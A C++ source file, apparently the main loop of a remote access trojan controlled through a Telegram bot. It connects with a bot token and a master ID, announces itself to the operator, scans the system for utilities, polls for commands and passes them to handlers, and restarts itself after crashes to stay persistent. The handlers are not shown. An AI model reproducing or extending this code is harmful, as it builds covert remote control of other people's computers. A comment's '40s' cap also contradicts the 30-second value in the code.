#include "macro.hpp"
#include "rat/tbot/tbot.hpp"
#include "rat/tbot/handler/handleUpdate.hpp"
#include "logging.hpp"
#include <string>
#include <thread>
#include <chrono>
#include <array>
#include "rat/system.hpp"
#include <cmath>
#include <fmt/chrono.h>
#include <fmt/core.h>
#include <unordered_map>
#include "rat/RatState.hpp"


// --- Global state ---
static uint32_t empty_updates_count = 0;
static uint32_t sleep_timout_ms = 500;
static std::string init_message;



// --- Forward declarations ---
void botLoop(void);
void invasiveBotLoop(void);
bool inline _isUpdateEmpty(const rat::tbot::Update& arg_Update);
void _dynamicSleep(uint32_t arg_Count);

// --- Entry point ---
int main(void) {
    invasiveBotLoop();
    return 0;
}

// --- Reboots the bot on crash ---
void invasiveBotLoop() {
    while (true) {
        try {
            botLoop();
        } catch (const std::exception& e) {
            init_message = fmt::format("Previous bot instance crashed: {}, restarting in 5s...", e.what());
            ERROR_LOG(init_message);
        } catch (...) {
            init_message = "Bot crashed due to unknown reason, restarting in 5s...";
            ERROR_LOG(init_message);
        }
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}

// --- Check if update is empty ---
bool inline _isUpdateEmpty(const rat::tbot::Update& arg_Update) {
    return (arg_Update.message.text.empty() && arg_Update.message.files.empty());
}

// --- Dynamically adjust sleep time based on number of empty updates ---
void _dynamicSleep(uint32_t arg_Count) {
    const uint32_t base_sleep = 500;      // Base sleep in ms
    const double growth_factor = 1.02;    // 2% growth per empty update
    const uint32_t max_sleep = 30000;     // Cap at 40s

    double sleep = base_sleep * std::pow(growth_factor, arg_Count);
    if (sleep > max_sleep) {
        sleep = max_sleep;
    }
    sleep_timout_ms = static_cast<uint32_t>(sleep);
}

// --- Main bot loop ---
void botLoop(void) {
    DEBUG_LOG("Bot constructing");
    rat::tbot::Bot bot(TOKEN, MASTER_ID);

    if (init_message.empty()) {
        init_message = fmt::format("Bot initialized at: {}", rat::system::getCurrentDateTime());
    }
    rat::RatState session_state;

    session_state.scanSystemPathsForUtilities();

    bot.sendMessage(init_message);
    bot.setOffset();
    while (true) {
        try {
            rat::tbot::Update update = bot.getUpdate();
            rat::tbot::handler::handleUpdate(session_state, bot, update);

            if(_isUpdateEmpty(update)) ++empty_updates_count;
          
            _dynamicSleep(empty_updates_count);
            std::this_thread::sleep_for(std::chrono::milliseconds(sleep_timout_ms));

        } catch (const std::exception& e) {
            ERROR_LOG("Error in bot loop: {}", e.what());
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }
}
